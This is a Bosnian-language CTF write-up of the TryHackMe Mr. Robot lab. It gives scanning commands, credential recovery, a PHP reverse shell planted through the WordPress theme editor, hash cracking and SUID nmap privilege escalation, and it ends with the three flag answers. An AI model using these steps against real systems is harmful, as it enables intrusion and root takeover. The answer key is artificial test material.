---
title: "Mr. Robot CTF"
date: 2021-05-23 12:32:00 +0800
categories:
  - Tryhackme
tags:
  - Tryhackme
  - Mr Robot
---



<p align="center">
  <img width="50%" src="/assets/images/mrrobotctf/mrrobot.gif" />
</p>

<p align="center">
  <b>👋 TryHackMe Mr. Robot CTF 👋</b>
</p>


## Hvala na posjeti!

<img src="/assets/images/mrrobotctf/mrrobot1.png" alt="img" align="right" width="400px">

Da li možemo hakovati Mr Robot CTF ? Ova virtualna mašina je **srednje** težine i naučit će nas mnogo korisnih stvari.

Uputstva će vam pomoći da dođete do istih odgovora, tu imate instrukcije korak po korak.

Korišteni programi:

+ **OpenVPN** 
+ **NMAP**
+ **GoBuster**
+ **Netcat**


## Uputstva

Da bismo počeli sa hakovanjem ove virtualne mašine, prvo se moramo konektovati na TryHackMe OpenVPN i moramo pokrenuti mašinu u Task 2. 

*Pretpostavljam da je vaša lokalna virtualna mašina sa [Kali_Linux](https://www.kali.org/) operativnim sistemom.*

1. Konektovanje pomoću **OpenVPN-a**:

   Prvo trebamo skinuti [OpenVPN](https://tryhackme.com/access) fajl od TryHackMe-a koji vam oni daju. Zatim upaliti terminal u direktoriji u koju ste skinuli OpenVPN fajl. Konektovanje se radi pomoću:

   ```shell
   sudo openvpn *IME_VAŠEG_FAJLA*.ovpn
   ```

2. **Enumeracija mreže**:

   Prvo šta radimo sa CTF-ovima jeste da pretražimo koji su portovi otvoreni. Što više znamo o sistemu to je bolje. U ovome slučaju koristimo Nmap za skeniranje mreže. 

   + Nmap skeniranje:

     ```shell 
     kali@kali:~/Desktop$ nmap *IP_ADRESA* -A
     ```
     

   + Rezultat Nmap skerniranja:

     ```shell
     kali@kali:-/Desktop$ nmap 10.10.51.194 -A
      Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 18:35 CEST
      Nmap scan report for 10.10.38.44
      Host is up (0.095s latency).
      Not shown: 997 filtered ports
      PORT    STATE  SERVICE  VERSION
      22/tcp  closed ssh
      80/tcp  open   http     Apache httpd
      |_http-server-header: Apache
      |_http-title: Site doesn't have a title (text/html).
      443/tcp open   ssl/http Apache httpd
      |_http-server-header: Apache
      |_http-title: Site doesn't have a title (text/html).
      | ssl-cert: Subject: commonName=www.example.com
      | Not valid before: 2015-09-16T10:45:03
      |_Not valid after:  2025-09-13T10:45:03
     

      Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
      Nmap done: 1 IP address (1 host up) scanned in 34.90 seconds
     ```

     Kao što vidimo imamo otvoren port 80 što nam govori da se radi o web stranici na HTTP protokolu.

   + Instalacija **seclists** liste: 

      ```shell
      sudo apt install seclists
      ```
      Nakon ove komande seclists-e će se instalirati u **/usr/share/seclists/** direktoriju.

   + Enumeracija direktorija na web serveru pomoću **gobuster-a**:

     ```shell
      kali@kali:~/Desktop$ gobuster dir -u http://10.10.51.194/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
      ===============================================================
      Gobuster v3.1.0
      by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
      ===============================================================
      [+] Url:                     http://10.10.51.194/
      [+] Method:                  GET
      [+] Threads:                 10
      [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
      [+] Negative Status codes:   404
      [+] User Agent:              gobuster/3.1.0
      [+] Timeout:                 10s
      ===============================================================
      2021/05/23 18:27:45 Starting gobuster in directory enumeration mode
      ===============================================================
      /.hta                 (Status: 403) [Size: 213]
      /.htaccess            (Status: 403) [Size: 218]
      /.htpasswd            (Status: 403) [Size: 218]
      /0                    (Status: 301) [Size: 0] [--> http://10.10.51.194/0/]
      /Image                (Status: 301) [Size: 0] [--> http://10.10.51.194/Image/]
      /admin                (Status: 301) [Size: 234] [--> http://10.10.51.194/admin/]
      /atom                 (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/atom/]
      /audio                (Status: 301) [Size: 234] [--> http://10.10.51.194/audio/]  
      /blog                 (Status: 301) [Size: 233] [--> http://10.10.51.194/blog/]   
      /css                  (Status: 301) [Size: 232] [--> http://10.10.51.194/css/]    
      /dashboard            (Status: 302) [Size: 0] [--> http://10.10.51.194/wp-admin/] 
      /favicon.ico          (Status: 200) [Size: 0]                                     
      /feed                 (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/]     
      /images               (Status: 301) [Size: 235] [--> http://10.10.51.194/images/] 
      /image                (Status: 301) [Size: 0] [--> http://10.10.51.194/image/]    
      /index.php            (Status: 301) [Size: 0] [--> http://10.10.51.194/]          
      /index.html           (Status: 200) [Size: 1188]                                  
      /js                   (Status: 301) [Size: 231] [--> http://10.10.51.194/js/]     
      /intro                (Status: 200) [Size: 516314]                                
      /license              (Status: 200) [Size: 309]                                   
      /login                (Status: 302) [Size: 0] [--> http://10.10.51.194/wp-login.php]
      /page1                (Status: 301) [Size: 0] [--> http://10.10.51.194/]            
      /phpmyadmin           (Status: 403) [Size: 94]                                               
      /readme               (Status: 200) [Size: 64]                                               
      /rdf                  (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/rdf/]            
      /robots               (Status: 200) [Size: 41]                                               
      /robots.txt           (Status: 200) [Size: 41]                                               
      /rss                  (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/]                
      /rss2                 (Status: 301) [Size: 0] [--> http://10.10.51.194/feed/]                
      /sitemap              (Status: 200) [Size: 0]                                                
      /sitemap.xml          (Status: 200) [Size: 0]                                                
      /video                (Status: 301) [Size: 234] [--> http://10.10.51.194/video/]             
      /wp-admin             (Status: 301) [Size: 237] [--> http://10.10.51.194/wp-admin/]          
      /wp-content           (Status: 301) [Size: 239] [--> http://10.10.51.194/wp-content/]
      /wp-config            (Status: 200) [Size: 0]                                        
      /wp-includes          (Status: 301) [Size: 240] [--> http://10.10.51.194/wp-includes/]
      /wp-cron              (Status: 200) [Size: 0]                                         
      /wp-links-opml        (Status: 200) [Size: 227]                                       
      /wp-load              (Status: 200) [Size: 0]                                         
      /wp-login             (Status: 200) [Size: 2606]                                      
      /wp-mail              (Status: 500) [Size: 3064]                                      
      /wp-settings          (Status: 500) [Size: 0]                                         
      /wp-signup            (Status: 302) [Size: 0] [--> http://10.10.51.194/wp-login.php?action=register]
      /xmlrpc               (Status: 405) [Size: 42]                                                      
      ===============================================================
      2021/05/23 18:40:33 Finished
      ===============================================================
      ```



3. Ulazak na web stranicu i pronalaženje prvog ključa:

   Nakon enumeracije možemo vidjeti više direktorija koje se nalaze na ovom web serveru. Ako pogledamo na TryHackMe Hint za prvi ključ možemo vidjeti da nam je hint **robots.txt**. Pretpostavljam da su ovaj hint i **/robots** direktorija povezane. Pored njih zanimljiv mi je **/wp-login** pretpostavljam da je u pitanju Wordpress. 


      + Ulazak na stranicu **Ukucajte dobivenu IP adresu u vaš web preglednik**:

      <p align="center">
         <img width="100%" src="/assets/images/mrrobotctf/ss1.png" />
      </p>

      + Ali ako ukucamo u naš link **/robots.txt (IP_ADRESA/robots.txt)** možemo vidjeti da nam izbaci prvi ključ, koji se nalazi u .txt formatu. 
      
      <p align="center">
         <img width="100%" src="/assets/images/mrrobotctf/ss2.png" />
      </p>

      - Pronašli smo dva fajla jedan **fsocity.dic i key-1-of-3.txt**. Prvi fajl nam je izgleda dictionary (riječnik) fajl.

      + Preuzimanje prvog ključa:

         Prvi ključ možemo vidjeti ulaskom na stranicu (http://IP_ADRESA/key-1-of-3.txt) ali ga možemo i pomoću komande **curl** preuzeti.

         ```shell
         curl -s http://IP_ADRESA/key-1-of-3.txt
         ```

      + Dobiveni ključ:

         ```shell
         kali@kali:~/Desktop$ curl -s http://10.10.51.194/key-1-of-3.txt

         073403c8a58a1f80d943455fb30724b9
         ```
      - **Prvi Ključ:** `073403c8a58a1f80d943455fb30724b9`




4. Pronalaženje drugog ključa:

   + **HINT:** White coloured text. 

      Ako se vratimo na **gobuster** možemo vidjeti da smo imali **wordpress** direktorije. Specifično me zanimaju: 

      ```shell
      /login (Status: 302)
      /wp-content (Status: 301)
      /admin (Status: 301)
      /wp-login (Status: 200)
      /license (Status: 200)
      /wp-includes (Status: 301)
      ```
      Kao što vidimo **/license** direktorija je sa 200 statusom. Status 200 nam govori da je stranica aktivna. **Curl** nam je najbolji prijatelj u ovome slučaju. 


   + Curl komanda:

      ```shell
      curl -s http://IP_ADRESA/license | tr -d "\n"
      ```


   + Dobiveni odgovor: 

      ```shell
      kali@kali:~/Desktop$ curl -s http://10.10.51.194/license | tr -d "\n"
     
      what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?do you want a    password or something?

      ZWxsaW90OkVSMjgtMDY1Mgo=
      ```
      Specifičan tekst je `ZWxsaW90OkVSMjgtMDY1Mgo=` izgleda kao **base64**.

   + Dekriptovanje **Base64-a**:

      Komanda koju ćemo koristiti je:

      ```shell
      echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
      ```
      Dobiveni odgovor:

      ```shell
      kali@kali:~/Desktop$ echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d

      elliot:ER28-0652
      ```
   + Dobili smo username i šifru pretpostavljam od wordpress-a. 
   
      **Zanimljiva činjenica:** Šifra je zapravo referenca na Elliot-ov broj sa identifikacione kartice na poslu i pojavljuje se u seriji.  


   + Vrijeme je da se pokušamo prijaviti na worpress. 

      Prvi korak je da odemo na: 

      ```shell
      http://IP_ADRESA/wp-login
      ```

   + Nakon prijave na stranici odmah u donjem lijevom uglu možemo vidjeti da je verzija wordpress-a `4.3.1`. Ovo je stara verzija wordpress-a.

      <p align="center">
         <img width="100%" src="/assets/images/mrrobotctf/ss3.png" />
      </p>

   + Pronalazimo dva korisnika od kojih Elliot (mi) smo administrator.

      <p align="center">
         <img width="100%" src="/assets/images/mrrobotctf/ss4.png" />
      </p>

   + Kao što sam rekao možemo vidjeti da je ova stara verzija wordpress-a ranjiva **PHP reverse shell-ovima.** [**LINK OVE SKRIPTE**](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

   + Pošto smo administrator potrebno je da odemo u Appearance. 

      <p align="center">
         <img width="100%" src="/assets/images/mrrobotctf/ss5.png" />
      </p>

   + A nakon toga idemo u Editor i zamjenimo kod sa skriptom za 404 PHP template iz linka gore. 

      <p align="center">
         <img width="100%" src="/assets/images/mrrobotctf/ss6.png" />
      </p>

      **NAPOMENA:** Obratiti pažnju na ip adresu u kodu tu nam ide lokalna IP adresa tj. IP adresa našeg računara. Lokalnu IP Adresu možemo provjeriti sa `ifconfig`. 

   + Nakon što smo kod zamijenili i promjenili IP adresu u skripti, pokrenut ćemo **netcat** na port-u koji nam piše u skripti. To radimo sljedećom komandom:

      ```shell
      nc -nlvp 1234
      ```

   + Nakon toga moramo otići na **http://IP_ADRESA/404.php** ovaj link u web pretraživaču. 

      <p align="center">
         <img width="100%" src="/assets/images/mrrobotctf/ss7.png" />
      </p>

      Kao što vidimo otvorili smo shell u terminalu. Netcat je dobio konekciju. 

   + Sada ćemo provjeriti koji se fajlovi nalaze u **/home/robot** direktoriji. To radimo pomoću komande: 

      ```shell
      ls -l /home/robot
      ```

   + Saznali smo lokaciju drugog ključa: 

      ```shell
      $ ls -l /home/robot
      total 8
      -r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
      -rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
      ```

   + Problem je u tome što mi nismo uopšte `robot` korisnik na ovoj mašini. To provjeravamo komandom `whoami`.

      ```shell
      $ whoami
      daemon
      ```

   + Jedini fajl koji možemo vidjeti jeste `password.raw-md5`. Hajmo da vidimo šta ima u ovome fajlu. 

      ```shell
      $ cat /home/robot/password.raw-md5
      robot:c3fcd3d76192e4007dfb496cca67e13b
      ```

   + MD5 Hash je u pitanju. Kao što znamo hash je matematička funkcija koja nakon što odradi svoj posao se ne može vratiti nazad. Ovo je dobro u smislu čuvanja šifri, ali MD5 je već star algoritam i lagan je da se krekuje. 

      Da bi uštedili vremena prvo ćemo pogledati da li se ovaj hash može krekovati online. [LINK](https://md5.gromweb.com/?md5=c3fcd3d76192e4007dfb496cca67e13b)

      Kao što možemo vidjeti na gore navedenom linku, može. **Šifra** je `abcdefghijklmnopqrstuvwxyz`
   
   + Sada se trebamo prijaviti kao `robot` korisnik. To radimo sa komandom:

      ```shell
      su - robot
      ```

      Ali nam se pojavi problem: 

      ```shell
      $ su - robot
      su: must be run from a terminal
      ```

      Ovo možemo popraviti sa Python-om. Prvo ćemo provjeriti da li je python uopšte instaliran. 

      ```shell
      $ which python
      /usr/bin/python
      ```

      Hajmo napraviti shell sa python-om. To radimo ovom komandom. 

      ```shell
      python -c 'import pty; pty.spawn("/bin/sh")'
      ```

      Kao što možete da vidite nije nam izbacilo nikakavu grešku, što znači da smo uspješno napravili shell u python-u.

   + Hajmo se prijaviti kao `robot` korisnik.

      ```shell
      $ su - robot           
      su - robot
      Password: abcdefghijklmnopqrstuvwxyz

      $ whoami
      whoami
      robot
      $ 
      ```
      
      Kao što vidimo prijavljeni smo kao robot korisnik.

   + **Drugi ključ:** 

      Koristimo komandu: 

      ```shell
      cat key-2-of-3.txt
      ```
      I dobivamo sljedeće:

      ```shell
      $ cat key-2-of-3.txt
      cat key-2-of-3.txt
      822c73956184f694993bede3eb39f959
      ```

   + **Drugi ključ:** `822c73956184f694993bede3eb39f959`

   

5. Pronalaženje trećeg ključa:

   + **HINT:** NMAP
   
      Ako se vratimo na Nmap rezultat koji smo dobili na početku možemo vidjeti da je SSH port zatvoren. Finalni ključ se većinom nalazi u `/root` direktoriji. Da bismo dobili root, moramo uraditi eskalaciju privilegija. Prva stvar koja me zanima jeste da li se korisnik `robot` nalazi u takozvanim sudo-erima. 

   + Da li je robot u sudo listi ? 

      ```shell
      $ sudo -l
      sudo -l
      [sudo] password for robot: abcdefghijklmnopqrstuvwxyz

      Sorry, user robot may not run sudo on linux.
      ```

      Korisnik robot nije u listi sa sudo privilegijama. Sada nam preostaje da vidimo koji programi su pod `root` korisnikom.  

   + Provjera SETUID-a pod kontrolom root-a:

      Komanda: 

      ```shell
      find / -user root -perm -4000 -print 2>/dev/null
      ```

      ```shell
      $ find / -user root -perm -4000 -print 2>/dev/null
      / -user root -perm -4000 -print 2>/dev/null
      /bin/ping
      /bin/umount
      /bin/mount
      /bin/ping6
      /bin/su
      /usr/bin/passwd
      /usr/bin/newgrp
      /usr/bin/chsh
      /usr/bin/chfn
      /usr/bin/gpasswd
      /usr/bin/sudo
      /usr/local/bin/nmap
      /usr/lib/openssh/ssh-keysign
      /usr/lib/eject/dmcrypt-get-device
      /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
      /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
      /usr/lib/pt_chown
      ```

      Odmah sam primjetio `/usr/local/bin/nmap` hajde da vidimo koja je verzija Nmap-a. 

   + Provjera Nmap verzije: 

      Komanda: 

      ```shell 
      nmap --version
      ```

      ```shell
      $ nmap --version
      nmap --version

      nmap version 3.81 ( http://www.insecure.org/nmap/ )
      ```

      Kao što vidimo verzija Nmap-a je **3.81**.

   + Enumeracija:

      Nakon malo istraživanja pronašao sam: 

      [LINK](https://pentestlab.blog/category/privilege-escalation/) kao što možemo pročitati na gore navedenom linku, ovo je starija Nmap verzija. Verzije od 2.02 do 5.21 su imale tzv. interactive mode (interaktivni mod) koji je dozvoljavao da izvršavamo komande. Pored toga ako provjerimo `SETUID` dozvolja nam da komande pokrećemo kao root. 

      ```shell
      $ ls -l /usr/local/bin/nmap
      ls -l /usr/local/bin/nmap
      -rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
      ```

   + Pokretanje Nmap-a u interaktivnom modu: 

      Komanda: 

      ```shell
      nmap --interactive
      ```

      ```shell
      $ nmap --interactive
      nmap --interactive

      Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
      Welcome to Interactive Mode -- press h <enter> for help
      nmap> !whoami
      !whoami
      root
      waiting to reap child : No child processes
      ```

      Vidimo da je nmap u interaktivnom modu root. 

   + Pronalaženje finalnog ključa: 

      Prvo ćemo provjeriti da li je treći flag u root-u. Komandom:

      ```shell
      !ls /root
      ```

      ```shell
      nmap> !ls /root
      !ls /root
      firstboot_done  key-3-of-3.txt
      waiting to reap child : No child processes
      ```
      
      Pronašli smo treći ključ koji je u tekstualnom fajlu. Sadržaj možemo pročitati sljedećom komandom: 

      ```shell
      !cat /root/key-3-of-3.txt
      ```

      ```shell
      nmap> !cat /root/key-3-of-3.txt
      !cat /root/key-3-of-3.txt
      04787ddef27c3dee1ee161b21670b4e4
      waiting to reap child : No child processes
      ```

   + **Treći Ključ:** `04787ddef27c3dee1ee161b21670b4e4`



## Zaključak

Zanimljiv CTF sa dosta referenci na seriju. Dosta stvari sam naučio, a najbitnije je da redovno updejtujete operativne sisteme i aplikacije, kao što vidimo primjer sa starijom verzijom `nmap-a` i `wordpress-a`. Također ne dozvolite da vam netko hakuje vaše račune, redovno mijenjajte šifre i koristite random šifre minimalne dužine od 32 znamenke za svaki račun. Pravila kojeg bi se svi trebali držati je jedna šifra jedan račun, i jedan račun jedna e-mail adresa.   


## Ključevi

Lista pitanja i odgovora:

| Pitanja | Odgovori |
| --- | --- |
| What is key 1 ?  | <kbd> 073403c8a58a1f80d943455fb30724b9 </kbd>|
| What is key 2 ?  | <kbd> 822c73956184f694993bede3eb39f959 </kbd> |
| What is key 3 ?  | <kbd> 04787ddef27c3dee1ee161b21670b4e4 </kbd> |

### Hvala puno na vašem vremenu !

